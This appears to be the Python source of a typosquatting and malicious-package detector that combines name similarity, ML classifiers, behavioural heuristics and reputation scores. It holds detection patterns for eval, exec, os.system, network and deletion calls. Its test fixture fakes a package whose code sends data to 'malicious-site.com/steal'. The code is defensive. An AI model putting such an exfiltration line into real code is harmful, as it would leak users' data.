#!/usr/bin/env python3
"""
Ensemble Detector for Typosentinel
Multi-layer ML pipeline for enhanced package threat detection
"""

import json
import re
import math
import numpy as np
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
import joblib
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class PackageData:
    name: str
    registry: str
    version: str
    metadata: Dict
    source_code: Optional[str] = None
    dependencies: Optional[List[str]] = None
    download_count: Optional[int] = None
    author_info: Optional[Dict] = None

@dataclass
class ThreatAssessment:
    risk_score: float
    confidence: float
    threat_type: str
    severity: str
    contributing_factors: List[str]
    recommendations: List[str]
    detailed_scores: Dict[str, float]

class SemanticSimilarityModel:
    """Detects typosquatting and similar package names"""
    
    def __init__(self):
        self.vectorizer = TfidfVectorizer(analyzer='char', ngram_range=(2, 4))
        self.known_packages = set()
        self.package_vectors = None
        
    def load_known_packages(self, packages: List[str]):
        """Load known legitimate packages for comparison"""
        self.known_packages = set(packages)
        if packages:
            self.package_vectors = self.vectorizer.fit_transform(packages)
    
    def find_similar(self, package_name: str, threshold: float = 0.7) -> List[Tuple[str, float]]:
        """Find similar package names that might indicate typosquatting"""
        if not self.package_vectors:
            return []
            
        query_vector = self.vectorizer.transform([package_name])
        similarities = cosine_similarity(query_vector, self.package_vectors)[0]
        
        similar_packages = []
        for i, similarity in enumerate(similarities):
            if similarity >= threshold:
                package = list(self.known_packages)[i]
                similar_packages.append((package, similarity))
                
        return sorted(similar_packages, key=lambda x: x[1], reverse=True)
    
    def calculate_typosquatting_score(self, package_name: str) -> float:
        """Calculate typosquatting risk score"""
        similar = self.find_similar(package_name, threshold=0.6)
        if not similar:
            return 0.0
            
        # Higher score for very similar names to popular packages
        max_similarity = max(sim for _, sim in similar)
        return min(max_similarity * 100, 100.0)

class MaliciousPackageClassifier:
    """ML classifier for detecting malicious packages"""
    
    def __init__(self):
        self.rf_model = RandomForestClassifier(n_estimators=100, random_state=42)
        self.gb_model = GradientBoostingClassifier(n_estimators=100, random_state=42)
        self.is_trained = False
        
    def extract_features(self, package_data: PackageData) -> np.ndarray:
        """Extract features for ML classification"""
        features = []
        
        # Name-based features
        name_features = self._extract_name_features(package_data.name)
        features.extend(name_features)
        
        # Metadata features
        metadata_features = self._extract_metadata_features(package_data.metadata)
        features.extend(metadata_features)
        
        # Code features (if available)
        if package_data.source_code:
            code_features = self._extract_code_features(package_data.source_code)
            features.extend(code_features)
        else:
            features.extend([0] * 10)  # Placeholder for missing code features
            
        # Dependency features
        if package_data.dependencies:
            dep_features = self._extract_dependency_features(package_data.dependencies)
            features.extend(dep_features)
        else:
            features.extend([0] * 5)  # Placeholder for missing dependency features
            
        return np.array(features)
    
    def _extract_name_features(self, name: str) -> List[float]:
        """Extract features from package name"""
        return [
            len(name),
            int(bool(re.search(r'\d', name))),  # Has numbers
            int(bool(re.search(r'[^a-zA-Z0-9\-_.]', name))),  # Has special chars
            self._calculate_entropy(name),
            int(self._detect_keyboard_patterns(name)),
            int(self._detect_typo_patterns(name)),
            name.count('-'),
            name.count('_'),
            name.count('.'),
            int(name.islower())
        ]
    
    def _extract_metadata_features(self, metadata: Dict) -> List[float]:
        """Extract features from package metadata"""
        return [
            len(metadata.get('description', '')),
            len(metadata.get('keywords', [])),
            int('license' in metadata),
            int('homepage' in metadata),
            int('repository' in metadata),
            len(metadata.get('author', {}).get('name', '')),
            int(bool(metadata.get('author', {}).get('email', ''))),
            len(metadata.get('maintainers', [])),
            int('scripts' in metadata),
            metadata.get('version_count', 0)
        ]
    
    def _extract_code_features(self, source_code: str) -> List[float]:
        """Extract features from source code"""
        return [
            len(source_code),
            source_code.count('eval('),
            source_code.count('exec('),
            source_code.count('subprocess'),
            source_code.count('os.system'),
            source_code.count('requests.get'),
            source_code.count('urllib'),
            int(bool(re.search(r'https?://(?!pypi\.org|npmjs\.com|github\.com)', source_code))),
            source_code.count('base64'),
            source_code.count('crypto')
        ]
    
    def _extract_dependency_features(self, dependencies: List[str]) -> List[float]:
        """Extract features from dependencies"""
        return [
            len(dependencies),
            sum(1 for dep in dependencies if 'crypto' in dep.lower()),
            sum(1 for dep in dependencies if 'request' in dep.lower()),
            sum(1 for dep in dependencies if len(dep) < 3),  # Very short deps
            sum(1 for dep in dependencies if re.search(r'\d{4,}', dep))  # Version-like numbers
        ]
    
    def _calculate_entropy(self, text: str) -> float:
        """Calculate Shannon entropy of text"""
        if not text:
            return 0.0
            
        char_counts = {}
        for char in text:
            char_counts[char] = char_counts.get(char, 0) + 1
            
        entropy = 0.0
        text_len = len(text)
        for count in char_counts.values():
            probability = count / text_len
            entropy -= probability * math.log2(probability)
            
        return entropy
    
    def _detect_keyboard_patterns(self, text: str) -> bool:
        """Detect keyboard walking patterns"""
        patterns = ['qwerty', 'asdf', 'zxcv', '1234', 'abcd']
        return any(pattern in text.lower() for pattern in patterns)
    
    def _detect_typo_patterns(self, text: str) -> bool:
        """Detect common typo patterns"""
        # Common character substitutions
        typo_patterns = [
            r'[0o]',  # 0 and o confusion
            r'[1il]',  # 1, i, l confusion
            r'rn',     # rn looks like m
            r'vv',     # vv looks like w
        ]
        return any(re.search(pattern, text.lower()) for pattern in typo_patterns)
    
    def train(self, training_data: List[Tuple[PackageData, bool]]):
        """Train the classifier with labeled data"""
        X = []
        y = []
        
        for package_data, is_malicious in training_data:
            features = self.extract_features(package_data)
            X.append(features)
            y.append(int(is_malicious))
            
        X = np.array(X)
        y = np.array(y)
        
        # Train both models
        self.rf_model.fit(X, y)
        self.gb_model.fit(X, y)
        self.is_trained = True
        
        logger.info(f"Trained classifier with {len(training_data)} samples")
    
    def predict_proba(self, package_data: PackageData) -> float:
        """Predict probability of package being malicious"""
        if not self.is_trained:
            return 0.5  # Default uncertainty
            
        features = self.extract_features(package_data).reshape(1, -1)
        
        # Ensemble prediction
        rf_prob = self.rf_model.predict_proba(features)[0][1]
        gb_prob = self.gb_model.predict_proba(features)[0][1]
        
        # Weighted average
        return (rf_prob * 0.6 + gb_prob * 0.4)

class BehavioralAnalyzer:
    """Analyze package behavior patterns"""
    
    def analyze(self, package_data: PackageData) -> float:
        """Analyze behavioral patterns and return risk score"""
        risk_score = 0.0
        
        # Check for suspicious installation patterns
        if package_data.source_code:
            risk_score += self._analyze_installation_behavior(package_data.source_code)
            
        # Check metadata patterns
        risk_score += self._analyze_metadata_behavior(package_data.metadata)
        
        # Check dependency patterns
        if package_data.dependencies:
            risk_score += self._analyze_dependency_behavior(package_data.dependencies)
            
        return min(risk_score, 100.0)
    
    def _analyze_installation_behavior(self, source_code: str) -> float:
        """Analyze installation-time behavior"""
        risk = 0.0
        
        # Check for post-install scripts
        if 'postinstall' in source_code.lower():
            risk += 20.0
            
        # Check for network calls during install
        network_patterns = [
            r'requests\.',
            r'urllib\.',
            r'http\.',
            r'fetch\(',
            r'XMLHttpRequest'
        ]
        
        for pattern in network_patterns:
            if re.search(pattern, source_code):
                risk += 15.0
                break
                
        # Check for file system operations
        fs_patterns = [
            r'os\.remove',
            r'os\.rmdir',
            r'shutil\.rmtree',
            r'fs\.unlink',
            r'fs\.rmdir'
        ]
        
        for pattern in fs_patterns:
            if re.search(pattern, source_code):
                risk += 10.0
                
        return risk
    
    def _analyze_metadata_behavior(self, metadata: Dict) -> float:
        """Analyze metadata for suspicious patterns"""
        risk = 0.0
        
        # Check for minimal metadata
        if not metadata.get('description'):
            risk += 15.0
            
        if not metadata.get('author'):
            risk += 10.0
            
        # Check for suspicious keywords
        keywords = metadata.get('keywords', [])
        suspicious_keywords = ['hack', 'crack', 'exploit', 'bypass']
        
        for keyword in keywords:
            if keyword.lower() in suspicious_keywords:
                risk += 25.0
                
        return risk
    
    def _analyze_dependency_behavior(self, dependencies: List[str]) -> float:
        """Analyze dependency patterns"""
        risk = 0.0
        
        # Too many dependencies
        if len(dependencies) > 50:
            risk += 10.0
            
        # Suspicious dependency names
        for dep in dependencies:
            if len(dep) < 3 or re.search(r'[0-9]{4,}', dep):
                risk += 5.0
                
        return risk

class ReputationScorer:
    """Score packages based on reputation metrics"""
    
    def score(self, package_data: PackageData) -> float:
        """Calculate reputation score (0-100, higher is better)"""
        score = 50.0  # Base score
        
        # Download count factor
        if package_data.download_count:
            if package_data.download_count > 1000000:
                score += 20.0
            elif package_data.download_count > 100000:
                score += 15.0
            elif package_data.download_count > 10000:
                score += 10.0
            elif package_data.download_count < 100:
                score -= 20.0
                
        # Author reputation
        if package_data.author_info:
            author_packages = package_data.author_info.get('package_count', 0)
            if author_packages > 10:
                score += 15.0
            elif author_packages == 0:
                score -= 15.0
                
        # Age and version history
        version_count = package_data.metadata.get('version_count', 0)
        if version_count > 10:
            score += 10.0
        elif version_count == 1:
            score -= 10.0
            
        return max(0.0, min(100.0, score))

class EnsembleDetector:
    """Main ensemble detector combining all models"""
    
    def __init__(self):
        self.similarity_model = SemanticSimilarityModel()
        self.malicious_classifier = MaliciousPackageClassifier()
        self.behavioral_analyzer = BehavioralAnalyzer()
        self.reputation_scorer = ReputationScorer()
        
        # Weights for ensemble combination
        self.weights = {
            'similarity': 0.25,
            'malicious': 0.35,
            'behavioral': 0.25,
            'reputation': 0.15
        }
    
    def analyze_package(self, package_data: PackageData) -> ThreatAssessment:
        """Comprehensive package analysis"""
        # 1. Semantic similarity analysis
        similarity_score = self.similarity_model.calculate_typosquatting_score(package_data.name)
        
        # 2. Malicious package classification
        malicious_prob = self.malicious_classifier.predict_proba(package_data) * 100
        
        # 3. Behavioral analysis
        behavioral_score = self.behavioral_analyzer.analyze(package_data)
        
        # 4. Reputation scoring (invert for risk)
        reputation_score = 100 - self.reputation_scorer.score(package_data)
        
        # Combine scores with weights
        final_score = (
            similarity_score * self.weights['similarity'] +
            malicious_prob * self.weights['malicious'] +
            behavioral_score * self.weights['behavioral'] +
            reputation_score * self.weights['reputation']
        )
        
        # Determine threat type and severity
        threat_type, severity = self._classify_threat(final_score, {
            'similarity': similarity_score,
            'malicious': malicious_prob,
            'behavioral': behavioral_score,
            'reputation': reputation_score
        })
        
        # Generate explanations and recommendations
        contributing_factors = self._explain_decision({
            'similarity': similarity_score,
            'malicious': malicious_prob,
            'behavioral': behavioral_score,
            'reputation': reputation_score
        })
        
        recommendations = self._generate_recommendations(final_score, threat_type)
        
        return ThreatAssessment(
            risk_score=final_score,
            confidence=self._calculate_confidence(final_score),
            threat_type=threat_type,
            severity=severity,
            contributing_factors=contributing_factors,
            recommendations=recommendations,
            detailed_scores={
                'similarity': similarity_score,
                'malicious': malicious_prob,
                'behavioral': behavioral_score,
                'reputation': reputation_score,
                'final': final_score
            }
        )
    
    def _classify_threat(self, score: float, component_scores: Dict[str, float]) -> Tuple[str, str]:
        """Classify threat type and severity"""
        if component_scores['similarity'] > 70:
            threat_type = "typosquatting"
        elif component_scores['malicious'] > 70:
            threat_type = "malicious_code"
        elif component_scores['behavioral'] > 60:
            threat_type = "suspicious_behavior"
        elif component_scores['reputation'] > 70:
            threat_type = "low_reputation"
        else:
            threat_type = "unknown"
            
        if score >= 80:
            severity = "critical"
        elif score >= 60:
            severity = "high"
        elif score >= 40:
            severity = "medium"
        else:
            severity = "low"
            
        return threat_type, severity
    
    def _explain_decision(self, scores: Dict[str, float]) -> List[str]:
        """Generate human-readable explanations"""
        factors = []
        
        if scores['similarity'] > 50:
            factors.append(f"High similarity to known packages (score: {scores['similarity']:.1f})")
            
        if scores['malicious'] > 50:
            factors.append(f"Malicious code patterns detected (score: {scores['malicious']:.1f})")
            
        if scores['behavioral'] > 40:
            factors.append(f"Suspicious behavioral patterns (score: {scores['behavioral']:.1f})")
            
        if scores['reputation'] > 50:
            factors.append(f"Low reputation indicators (score: {scores['reputation']:.1f})")
            
        return factors
    
    def _generate_recommendations(self, score: float, threat_type: str) -> List[str]:
        """Generate actionable recommendations"""
        recommendations = []
        
        if score >= 80:
            recommendations.append("BLOCK: Do not use this package")
            recommendations.append("Report to security team immediately")
        elif score >= 60:
            recommendations.append("CAUTION: Manual review required")
            recommendations.append("Consider alternative packages")
        elif score >= 40:
            recommendations.append("MONITOR: Use with increased monitoring")
            recommendations.append("Review package contents before use")
        else:
            recommendations.append("ALLOW: Package appears safe")
            
        if threat_type == "typosquatting":
            recommendations.append("Verify package name spelling")
            recommendations.append("Check official package repositories")
        elif threat_type == "malicious_code":
            recommendations.append("Scan with additional security tools")
            recommendations.append("Review source code manually")
            
        return recommendations
    
    def _calculate_confidence(self, score: float) -> float:
        """Calculate confidence in the assessment"""
        # Higher confidence for extreme scores
        if score > 80 or score < 20:
            return 0.9
        elif score > 70 or score < 30:
            return 0.8
        elif score > 60 or score < 40:
            return 0.7
        else:
            return 0.6
    
    def save_models(self, path: str):
        """Save trained models"""
        joblib.dump({
            'malicious_classifier': self.malicious_classifier,
            'similarity_model': self.similarity_model,
            'weights': self.weights
        }, path)
        
    def load_models(self, path: str):
        """Load trained models"""
        data = joblib.load(path)
        self.malicious_classifier = data['malicious_classifier']
        self.similarity_model = data['similarity_model']
        self.weights = data.get('weights', self.weights)

def main():
    """Test the ensemble detector"""
    # Create test package data
    test_package = PackageData(
        name="reqeusts",  # Typo of "requests"
        registry="pypi",
        version="1.0.0",
        metadata={
            "description": "HTTP library",
            "author": {"name": "Unknown"},
            "version_count": 1
        },
        source_code="import requests\nrequests.get('http://malicious-site.com/steal')",
        dependencies=["urllib3"],
        download_count=50
    )
    
    # Initialize detector
    detector = EnsembleDetector()
    
    # Load some known packages for similarity detection
    known_packages = ["requests", "urllib3", "numpy", "pandas", "flask"]
    detector.similarity_model.load_known_packages(known_packages)
    
    # Analyze package
    assessment = detector.analyze_package(test_package)
    
    # Print results
    print("\n=== Typosentinel Ensemble Detection Results ===")
    print(f"Package: {test_package.name}")
    print(f"Risk Score: {assessment.risk_score:.2f}/100")
    print(f"Threat Type: {assessment.threat_type}")
    print(f"Severity: {assessment.severity}")
    print(f"Confidence: {assessment.confidence:.2f}")
    
    print("\nDetailed Scores:")
    for component, score in assessment.detailed_scores.items():
        print(f"  {component}: {score:.2f}")
    
    print("\nContributing Factors:")
    for factor in assessment.contributing_factors:
        print(f"  - {factor}")
    
    print("\nRecommendations:")
    for rec in assessment.recommendations:
        print(f"  - {rec}")

if __name__ == "__main__":
    main()